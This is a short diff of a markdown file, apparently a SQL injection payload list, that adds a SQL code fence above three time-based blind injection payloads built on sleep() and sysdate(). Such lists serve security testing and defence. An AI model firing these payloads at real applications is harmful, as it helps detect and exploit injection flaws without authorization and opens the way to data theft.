@@ -1,5 +1,7 @@
 ## Parameter
 
+```sql
+
 or sleep(5)
 (select*from(select(sleep(5)))a)
 0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
